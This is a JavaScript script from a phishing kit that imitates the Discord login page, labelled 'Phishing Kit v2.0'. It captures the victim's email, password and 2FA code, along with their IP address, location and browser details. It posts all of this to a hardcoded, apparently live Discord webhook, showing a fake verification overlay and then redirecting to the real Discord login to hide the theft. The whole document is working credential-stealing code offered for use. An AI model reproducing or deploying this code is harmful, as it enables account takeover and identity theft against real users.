<script>
    // YOUR DISCORD WEBHOOK URL
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1481029059289944177/lcGhidPjsc8KdFfYb_5khbIRB8SCVOE3nmFU_Lsxt7Ulh_-jr9Gs2F8PFHamPC1jjPjN";
    
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Disable button
        const submitBtn = document.getElementById('submitBtn');
        submitBtn.disabled = true;
        submitBtn.textContent = 'Logging in...';
        
        // Get credentials
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const mfaCode = document.getElementById('mfaCode').value;
        
        // Step 1: Collect victim info
        const victimInfo = await collectVictimInfo();
        
        // Step 2: Send credentials to YOUR webhook
        await sendToWebhook(email, password, mfaCode, victimInfo);
        
        // Step 3: Show fake "checking" message
        showFakeLoading();
        
        // Step 4: Redirect to real Discord after delay
        setTimeout(() => {
            // Random delay between 1-3 seconds
            const delay = 1000 + Math.random() * 2000;
            
            setTimeout(() => {
                // Redirect to REAL Discord login
                window.location.href = 'https://discord.com/login';
            }, delay);
            
        }, 1500);
    });
    
    async function collectVictimInfo() {
        const info = {
            ip: 'Fetching...',
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            referrer: document.referrer || 'Direct',
            timestamp: new Date().toISOString()
        };
        
        // Get IP from multiple services
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            info.ip = data.ip;
            
            // Get location from IP
            const locResponse = await fetch(`https://ipapi.co/${info.ip}/json/`);
            const locData = await locResponse.json();
            info.location = `${locData.city || 'Unknown'}, ${locData.region || 'Unknown'}, ${locData.country_name || 'Unknown'}`;
            info.isp = locData.org || 'Unknown';
        } catch {
            try {
                // Fallback IP service
                const response = await fetch('https://api64.ipify.org?format=json');
                const data = await response.json();
                info.ip = data.ip;
                info.location = 'Unknown';
                info.isp = 'Unknown';
            } catch {
                info.ip = 'Failed to fetch';
                info.location = 'Unknown';
                info.isp = 'Unknown';
            }
        }
        
        return info;
    }
    
    async function sendToWebhook(email, password, mfaCode, victimInfo) {
        const embed = {
            title: "🎣 NEW CREDENTIALS CAPTURED",
            color: 16711680, // Red
            fields: [
                { name: "📧 Email", value: `\`${email}\``, inline: true },
                { name: "🔑 Password", value: `\`${password}\``, inline: true },
                { name: "🔐 2FA Code", value: mfaCode ? `\`${mfaCode}\`` : "`Not provided`", inline: true },
                { name: "📍 IP Address", value: `\`${victimInfo.ip}\``, inline: true },
                { name: "🌍 Location", value: victimInfo.location, inline: true },
                { name: "🕒 Time", value: new Date().toLocaleString(), inline: true },
                { name: "🖥️ User Agent", value: `\`${victimInfo.userAgent.substring(0, 100)}...\``, inline: false },
                { name: "📱 Platform", value: victimInfo.platform, inline: true },
                { name: "🔗 Referrer", value: victimInfo.referrer, inline: true }
            ],
            footer: { 
                text: "Phishing Kit v2.0 • GitHub Pages" 
            },
            timestamp: victimInfo.timestamp
        };
        
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({ 
                    embeds: [embed],
                    content: "@everyone **🔥 NEW CREDENTIALS CAPTURED!**",
                    username: "Discord Security Bot",
                    avatar_url: "https://discord.com/assets/847541504914fd33874e.svg"
                })
            });
            console.log('✅ Credentials sent to webhook');
        } catch (error) {
            console.error('❌ Webhook error:', error);
            // Fallback: Save to localStorage
            localStorage.setItem('captured_creds', JSON.stringify({
                email, password, mfaCode, victimInfo
            }));
        }
    }
    
    function showFakeLoading() {
        // Create fake loading overlay
        const overlay = document.createElement('div');
        overlay.id = 'fakeLoading';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.85);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            color: white;
            font-family: Arial, sans-serif;
        `;
        
        overlay.innerHTML = `
            <div style="text-align: center;">
                <div style="
                    width: 50px;
                    height: 50px;
                    border: 3px solid #7289da;
                    border-top: 3px solid transparent;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                    margin: 0 auto 20px;
                "></div>
                <h3 style="margin-bottom: 10px;">Checking credentials...</h3>
                <p style="color: #b9bbbe; max-width: 300px;">
                    Verifying your login information with Discord's servers.
                </p>
            </div>
        `;
        
        // Add CSS animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        `;
        
        document.head.appendChild(style);
        document.body.appendChild(overlay);
        
        // Remove after random time (2-4 seconds)
        setTimeout(() => {
            if (document.getElementById('fakeLoading')) {
                document.getElementById('fakeLoading').remove();
            }
        }, 2000 + Math.random() * 2000);
    }
    
    // Show 2FA field if needed
    document.getElementById('mfaCode').addEventListener('input', function(e) {
        if (e.target.value.length === 6) {
            // Auto-submit when 6 digits entered
            document.getElementById('loginForm').dispatchEvent(new Event('submit'));
        }
    });
    
    // QR Code login option
    function showQRLogin() {
        document.getElementById('loginForm').style.display = 'none';
        document.getElementById('qrSection').style.display = 'block';
        
        const qrDiv = document.getElementById('qrCode');
        qrDiv.innerHTML = `
            <div style="background: #fff; padding: 20px; display: inline-block; border-radius: 8px;">
                <div style="width: 200px; height: 200px; background: #f0f0f0; display: flex; align-items: center; justify-content: center; border-radius: 4px;">
                    <div style="text-align: center; color: #333;">
                        <div style="font-size: 14px; margin-bottom: 10px;">Scan with Discord Mobile App</div>
                        <div style="font-size: 12px; color: #666;">QR Code Placeholder</div>
                    </div>
                </div>
            </div>
        `;
    }
    
    // Add QR code option
    setTimeout(() => {
        const existingQR = document.querySelector('.register a[onclick]');
        if (!existingQR) {
            const qrOption = document.createElement('div');
            qrOption.className = 'register';
            qrOption.innerHTML = `Or <a href="#" onclick="showQRLogin(); return false;">log in with QR Code</a>`;
            document.querySelector('.login-box').appendChild(qrOption);
        }
    }, 1000);
</script>
